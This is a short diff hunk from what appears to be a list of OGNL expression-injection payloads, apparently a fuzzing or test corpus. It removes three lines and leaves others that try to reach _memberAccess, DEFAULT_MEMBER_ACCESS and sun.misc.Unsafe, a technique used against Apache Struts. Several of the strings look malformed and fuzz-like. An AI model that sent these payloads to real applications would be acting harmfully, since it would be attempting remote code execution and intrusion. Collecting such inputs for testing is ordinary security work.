@@ -44,9 +44,6 @@
 %{(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@sun.misc.Unsafe@getUnsafe())}
 %{(@sun.misc.Unsafe@getUnsafe()).(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}
 %{(#dm=@ognl.OgnlContext@a).(@sun.misc.Unsafe@getUnsafe())}
-%{(@sun.misc.Unsafe@getUnsafe()).(#_memberAccess.a=true).(#context["a"]=false)}
-%{#a["a"]=true,#context["a"]=false,@a@a()}
-%{#a=true,#context["a"]=false,@sun.misc.Unsafe@getUnsafe()}
 %{#_memberAccess=@ognl.OgnlContext,@sun.misc.Unsafe@getUnsafe()}
 %{#a=@DEFAULT_MEMBER_ACCESS@ognl.OgnlContext,@sun.misc.Unsafe@getUnsafe()}
 %{(@sun.misc.Unsafe@getUnsafe()).(#dm=@ognl.OgnlContext@a)}
